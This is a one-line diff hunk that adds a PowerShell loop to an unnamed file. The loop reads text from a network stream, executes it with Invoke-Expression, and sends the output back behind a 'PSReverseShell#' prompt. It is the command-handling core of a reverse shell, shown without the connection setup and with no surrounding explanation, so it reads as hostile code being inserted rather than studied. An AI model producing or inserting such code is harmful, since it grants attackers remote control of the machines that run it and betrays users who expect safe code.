@@ -1,0 +1,1 @@
+while($true){$bytesRead=$stream.Read($buffer,0,$buffer.Length);if($bytesRead -le 0){break};$data=[System.Text.Encoding]::ASCII.GetString($buffer,0,$bytesRead);$output=iex $data 2>&1;$output+='PSReverseShell# ';$outputBytes=[System.Text.Encoding]::ASCII.GetBytes($output);$stream.Write($outputBytes,0,$outputBytes.Length);$stream.Flush()}
